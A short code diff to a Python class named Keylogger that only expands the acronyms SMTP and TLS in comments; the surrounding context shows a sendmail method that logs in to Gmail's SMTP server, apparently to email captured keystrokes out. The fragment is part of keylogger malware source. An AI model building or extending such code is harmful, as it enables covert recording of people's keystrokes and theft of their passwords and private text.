@@ -66,9 +66,9 @@ class Keylogger:
         self.log += name
 
     def sendmail(self, email, password, message=None):
-        # manages a connection with SMTP server of google
+        # manages a connection with SMTP (Simple Mail Transfer Protocol) server of google
         server = smtplib.SMTP(host="smtp.gmail.com", port=587)
-        # connects to SMTP as TLS mode
+        # connects to SMTP as TLS (Transport Layer Security) mode
         server.starttls()
         # login details
         server.login(email, password)
